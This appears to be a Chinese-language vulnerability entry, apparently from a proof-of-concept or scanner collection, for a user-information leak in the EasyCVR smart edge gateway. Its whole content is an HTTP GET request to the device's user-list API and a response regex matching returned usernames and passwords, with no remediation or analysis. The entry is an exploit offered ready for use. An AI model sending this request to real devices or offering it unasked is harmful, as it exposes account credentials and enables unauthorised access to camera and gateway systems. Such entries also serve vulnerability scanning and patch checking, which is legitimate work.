# EasyCVR智能边缘网关用户信息泄漏漏洞

EasyCVR ｜ 信息泄露 ｜ —
- **请求**：`GET /api/v1/userlist?pageindex=0&pagesize=10 HTTP/1.1`
- **响应特征**：200 ^(?=.*?Username)(?=.*?Password).*?$